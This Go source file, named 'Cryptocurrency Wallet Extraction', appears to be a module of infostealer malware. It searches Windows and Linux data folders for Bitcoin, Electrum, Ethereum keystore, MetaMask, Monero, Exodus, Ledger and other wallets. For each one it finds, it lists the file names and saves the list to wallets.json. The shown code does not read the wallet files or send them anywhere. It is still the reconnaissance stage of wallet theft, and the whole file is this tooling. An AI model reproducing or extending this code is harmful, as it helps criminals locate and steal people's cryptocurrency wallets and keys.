// ============================================================
// wallets.go - Cryptocurrency Wallet Extraction
// ============================================================
package cryptowallets

import (
	"encoding/json"
	"log"
	"os"
	"path/filepath"
	"runtime"
)

type WalletInfo struct {
	Name    string   `json:"name"`
	Type    string   `json:"type"`
	Path    string   `json:"path"`
	Files   []string `json:"files"`
}

// Run extracts cryptocurrency wallet information
func Run() {
	log.Println("💰 Extracting cryptocurrency wallets...")
	
	wallets := []WalletInfo{}
	
	// Bitcoin wallets
	wallets = append(wallets, findBitcoinWallets()...)
	
	// Ethereum wallets
	wallets = append(wallets, findEthereumWallets()...)
	
	// Monero wallets
	wallets = append(wallets, findMoneroWallets()...)
	
	// Other wallets
	wallets = append(wallets, findOtherWallets()...)
	
	saveWallets(wallets)
}

// findBitcoinWallets finds Bitcoin wallets
func findBitcoinWallets() []WalletInfo {
	var wallets []WalletInfo
	
	if runtime.GOOS == "windows" {
		paths := []string{
			filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallets"),
			filepath.Join(os.Getenv("APPDATA"), "Electrum", "wallets"),
			filepath.Join(os.Getenv("APPDATA"), "Armory"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Bitcoin Wallet",
					Type: "Bitcoin",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	if runtime.GOOS == "linux" {
		paths := []string{
			filepath.Join(os.Getenv("HOME"), ".bitcoin", "wallets"),
			filepath.Join(os.Getenv("HOME"), ".electrum", "wallets"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Bitcoin Wallet",
					Type: "Bitcoin",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	return wallets
}

// findEthereumWallets finds Ethereum wallets
func findEthereumWallets() []WalletInfo {
	var wallets []WalletInfo
	
	if runtime.GOOS == "windows" {
		paths := []string{
			filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"),
			filepath.Join(os.Getenv("APPDATA"), "MetaMask"),
			filepath.Join(os.Getenv("APPDATA"), "MyEtherWallet"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Ethereum Wallet",
					Type: "Ethereum",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	if runtime.GOOS == "linux" {
		paths := []string{
			filepath.Join(os.Getenv("HOME"), ".ethereum", "keystore"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Ethereum Wallet",
					Type: "Ethereum",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	return wallets
}

// findMoneroWallets finds Monero wallets
func findMoneroWallets() []WalletInfo {
	var wallets []WalletInfo
	
	if runtime.GOOS == "windows" {
		paths := []string{
			filepath.Join(os.Getenv("APPDATA"), "monero", "wallet"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Monero Wallet",
					Type: "Monero",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	if runtime.GOOS == "linux" {
		paths := []string{
			filepath.Join(os.Getenv("HOME"), ".monero", "wallet"),
		}
		
		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				wallet := WalletInfo{
					Name: "Monero Wallet",
					Type: "Monero",
					Path: path,
				}
				
				files, err := os.ReadDir(path)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	return wallets
}

// findOtherWallets finds other cryptocurrency wallets
func findOtherWallets() []WalletInfo {
	var wallets []WalletInfo
	
	// Common wallet paths
	walletPaths := map[string]string{
		"Exodus":     "Exodus",
		"Atomic":     "Atomic",
		"Jaxx":       "Jaxx",
		"Coinomi":    "Coinomi",
		"Guarda":     "Guarda",
		"Trust":      "Trust",
		"Ledger":     "Ledger Live",
		"Trezor":     "Trezor",
	}
	
	for name, path := range walletPaths {
		if runtime.GOOS == "windows" {
			fullPath := filepath.Join(os.Getenv("APPDATA"), path)
			if _, err := os.Stat(fullPath); err == nil {
				wallet := WalletInfo{
					Name: name + " Wallet",
					Type: name,
					Path: fullPath,
				}
				
				files, err := os.ReadDir(fullPath)
				if err == nil {
					for _, file := range files {
						wallet.Files = append(wallet.Files, file.Name())
					}
				}
				
				wallets = append(wallets, wallet)
			}
		}
	}
	
	return wallets
}

// saveWallets saves wallet information to file
func saveWallets(wallets []WalletInfo) {
	data, err := json.MarshalIndent(wallets, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to marshal wallets: %v", err)
		return
	}
	
	if err := os.WriteFile("wallets.json", data, 0644); err != nil {
		log.Printf("❌ Failed to save wallets: %v", err)
		return
	}
	
	log.Printf("✅ Found %d wallets", len(wallets))
}